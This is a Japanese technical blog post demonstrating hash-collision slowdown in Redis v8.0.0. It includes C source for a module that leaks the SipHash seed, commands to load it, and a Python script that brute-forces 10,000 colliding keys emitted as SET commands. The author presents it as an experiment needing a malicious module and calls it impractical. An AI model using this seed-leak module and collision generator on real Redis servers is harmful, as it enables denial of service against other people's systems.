---
title: "Redis にてハッシュ衝突を行う"
categories: [security]
tags: ["tag"]
date: 2026-03-08 23:28:06 +0900
toc: true
---

# Redis にてハッシュ衝突を行う

一般のハッシュマップにおいて、ハッシュ関数が異なる入力に対して同じハッシュ値を生成することで「ハッシュ衝突」が発生します。
あまり意識されませんが、Redis もハッシュマップを内部で利用するため、ハッシュ衝突が発生する可能性があります。

実際に Redis でハッシュ衝突を発生させてみましょう。

## Redis のハッシュ関数と衝突

Redis(v8.0.0) では、ハッシュ関数として SipHash というアルゴリズムを利用しています。
ここではその詳細に触れませんが、現在時点で SipHash は安全なハッシュ関数とされており、結果が同一となるハッシュ値を意図的に生成することは困難です。

しかし、ハッシュテーブルというデータの構造上、例えハッシュ値が異なっていても衝突を起こすことがあります。
Redis では、ハッシュテーブルのサイズが 128→256→512 と倍々に増加していき、「ハッシュ値の下位 n ビット」を利用してハッシュテーブルのインデックスを決定します。

このため、「ハッシュテーブルが特定のサイズの時、同一のインデックスに分類されるキー」は Bruteforce 出来る...かもしれません。テーブルサイズに依存します。

ただし、SipHash は seed と呼ばれる変数を別途必要とします。Redis においてはプロセス起動時に 1 度だけ作成され、以降メモリ内に保持されます。

生成箇所:
https://github.com/redis/redis/blob/e91a340e241cf0abe3c6a0c254214fbe4aa1d95f/src/server.c#L7282-L7284

保持する変数:
https://github.com/redis/redis/blob/20f163eb3dcc1311cfe6c0dda5a3beef08ab1a5d/src/dict.c#L103-L107

## seed をリークさせるモジュールを作る

v8.0.0 において（現時点で最新版のコードからこれは消えています）、dict.c に `dictGetHashFunctionSeed` という関数が存在していました。
https://github.com/redis/redis/blob/e91a340e241cf0abe3c6a0c254214fbe4aa1d95f/src/dict.c#L100-L102

これを用いることで、SipHash の seed をリークさせる Redis モジュールを作成することが出来ます。

```c
#include "redismodule.h"
#include "dict.h"

#define UNUSED(x) (void)(x)

// get the seed used by Redis for SipHash, which is used for dict hashing and other internal purposes. This is not a public API, but it can be useful for testing and debugging.
int GetSiphashSeedCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc)
{
    // no need to use args
    UNUSED(argv);
    UNUSED(argc);

    uint8_t *seed = dictGetHashFunctionSeed();
    if (seed == NULL)
    {
        return RedisModule_ReplyWithError(ctx, "Seed not available via function");
    }

    RedisModule_ReplyWithArray(ctx, 16);
    for (int i = 0; i < 16; i++)
    {
        RedisModule_ReplyWithLongLong(ctx, seed[i]);
    }
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc)
{
    // no need to use args
    UNUSED(argv);
    UNUSED(argc);

    if (RedisModule_Init(ctx, "siphashmodule", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR)
    {
        return REDISMODULE_ERR;
    }

    if (RedisModule_CreateCommand(ctx, "getsiphashseed", GetSiphashSeedCommand, "readonly", 0, 0, 0) == REDISMODULE_ERR)
    {
        return REDISMODULE_ERR;
    }

    return REDISMODULE_OK;
}
```

このモジュールのコンパイルには、Redis v8.0.0 のソースコードが必要です。この上で、コンパイルを行います。
```bash
# should be on the root of redis repository
$ gcc -fPIC -shared -o siphashmodule.so src/siphashmodule.c -I src/
```

コンパイルできたら、Redis にロードしてみましょう。`redis.conf` に記述を行っても良いです。
```bash
$ redis-server --loadmodule /path/to/siphashmodule.so
```

`redis-cli` にて、`getsiphashseed` コマンドを実行してみましょう。
```bash
$ redis-cli
127.0.0.1:6379> DEBUG HTSTATS 0
[Dictionary HT]
Hash table 0 stats (main hash table):
 table size: 512
 number of elements: 100
[Expires HT]
Hash table 0 stats (main hash table):
No stats available for empty dictionaries
127.0.0.1:6379> getsiphashseed
 1) (integer) 57
 2) (integer) 238
 3) (integer) 22
 4) (integer) 0
 5) (integer) 188
 6) (integer) 214
 7) (integer) 54
 8) (integer) 127
 9) (integer) 251
10) (integer) 190
11) (integer) 230
12) (integer) 25
13) (integer) 100
14) (integer) 27
15) (integer) 119
16) (integer) 163
```

## Redis と同様のハッシュ値から、同一のインデックスに分類されるキーを生成する
seed が判明したことで、ハッシュ関数の再現が可能になりました。

10000個の値を挿入することを想定すると、最終的なテーブルサイズは 16384 になるため、Mask は 16383 になります。
これを元に、同一のインデックスに分類されるキーを生成するスクリプトを作成してみましょう。

```python
import struct
import json
import random
import time
from multiprocessing import Pool, Manager

# --- SipHash-1-2 の実装 (Redis 4.0以降) ---
def rotl64(v, s):
    return ((v << s) & 0xffffffffffffffff) | (v >> (64 - s))

def sipround(v0, v1, v2, v3):
    v0 = (v0 + v1) & 0xffffffffffffffff
    v2 = (v2 + v3) & 0xffffffffffffffff
    v1 = rotl64(v1, 13)
    v3 = rotl64(v3, 16)
    v1 ^= v0
    v3 ^= v2
    v0 = rotl64(v0, 32)
    v2 = (v2 + v1) & 0xffffffffffffffff
    v0 = (v0 + v3) & 0xffffffffffffffff
    v1 = rotl64(v1, 17)
    v3 = rotl64(v3, 21)
    v1 ^= v2
    v3 ^= v0
    v2 = rotl64(v2, 32)
    return v0, v1, v2, v3

def siphash12(key, msg):
    k0, k1 = struct.unpack('<QQ', key)
    v0 = 0x736f6d6570736575 ^ k0
    v1 = 0x646f72616e646f6d ^ k1
    v2 = 0x6c7967656e657261 ^ k0
    v3 = 0x7465646279746573 ^ k1

    msg_len = len(msg)
    offset = 0
    left = msg_len

    # 8バイトごとの処理
    while left >= 8:
        m = struct.unpack('<Q', msg[offset:offset+8])[0]
        v3 ^= m
        v0, v1, v2, v3 = sipround(v0, v1, v2, v3) # 1 round for SipHash-1-x
        v0 ^= m
        offset += 8
        left -= 8

    # 最後のブロック処理（パディングと長さ）
    last_bytes = msg[offset:]
    m = 0
    for i, b in enumerate(last_bytes):
        m |= b << (8 * i)
    m |= (msg_len & 0xff) << 56

    v3 ^= m
    v0, v1, v2, v3 = sipround(v0, v1, v2, v3)
    v0 ^= m

    # ファイナライズ (2 rounds for SipHash-x-2)
    v2 ^= 0xff
    for _ in range(2):
        v0, v1, v2, v3 = sipround(v0, v1, v2, v3)

    return v0 ^ v1 ^ v2 ^ v3


def find_collisions_in_range(args):
    """指定された範囲内で衝突するキーを探索する"""
    start, end, seed_bytes, target_mask, target_bucket = args
    colliding_keys = []
    
    for current_num in range(start, end):
        # Redisは数値を文字列としてハッシュ化するため、文字列のbytesに変換する
        msg = str(current_num).encode('ascii')
        
        # ハッシュ計算
        h = siphash12(seed_bytes, msg)
        
        # 衝突判定
        if (h & target_mask) == target_bucket:
            colliding_keys.append(current_num)
    
    return colliding_keys


def main():
    # 取得した Redis の SipHash Seed
    seed_array = [57,238,22,0,188,214,54,127,251,190,230,25,100,27,119,163]
    seed_bytes = bytes(seed_array)

    # 10,000キー挿入後の最終的なテーブルサイズは 16384 なので、Maskは 16383
    TARGET_MASK = 16383
    TARGET_BUCKET = 0
    TARGET_COUNT = 10000
    MAX_INT32 = 2147483647

    print(f"[*] ターゲットMask: {TARGET_MASK} (バケット: {TARGET_BUCKET})")
    print(f"[*] 衝突キーを {TARGET_COUNT} 個探索中... (数分かかる場合があります)")

    colliding_keys = []
    current_num = 1
    start_time = time.time()
    
    # 4並列で処理
    NUM_WORKERS = 4
    CHUNK_SIZE = 1000000  # 各ワーカーが一度に処理する範囲
    
    with Pool(NUM_WORKERS) as pool:
        while len(colliding_keys) < TARGET_COUNT:
            if current_num > MAX_INT32:
                print("エラー: int32の範囲内で十分なキーが見つかりませんでした。")
                break
            
            # 各ワーカーに割り当てる範囲を準備
            tasks = []
            for i in range(NUM_WORKERS):
                start = current_num + i * CHUNK_SIZE
                end = start + CHUNK_SIZE
                if start > MAX_INT32:
                    break
                if end > MAX_INT32:
                    end = MAX_INT32 + 1
                tasks.append((start, end, seed_bytes, TARGET_MASK, TARGET_BUCKET))
            
            # 並列処理実行
            results = pool.map(find_collisions_in_range, tasks)
            
            # 結果を集約
            for result in results:
                colliding_keys.extend(result)
                if len(colliding_keys) >= TARGET_COUNT:
                    # 必要な数だけ切り詰め
                    colliding_keys = colliding_keys[:TARGET_COUNT]
                    break
            
            current_num += NUM_WORKERS * CHUNK_SIZE
            elapsed = time.time() - start_time
            print(f"  ... {len(colliding_keys)} 個発見 (試行範囲: ~{current_num:,}, 経過時間: {elapsed:.2f} 秒)")

    print(f"[*] 探索完了! 経過時間: {time.time() - start_time:.2f} 秒")

    # データの出力
    for key in colliding_keys:
        print(f"SET {key} {random.randint(1, 1000000)}")

if __name__ == "__main__":
    main()
```

総当たりに検索しているだけなので、結構時間がかかります。よって並列処理を入れて現在は 4 並列で計算を行っています。
必要に応じて調整を行ってください。

ランダムに生成されたキー 10,000 個を挿入する際と比べて、明らかに挿入にかかる時間が増加することが分かるかと思います。

## まとめ
Redis であったとしても、理論上はハッシュテーブル上で衝突が起こることが確認できました。
ただし、今回は「悪意のある Redis モジュール」を作成し、seed をリークしている上、現在のハッシュテーブルの様子を確認するコマンドまで許容しています。現実的には難しいでしょう。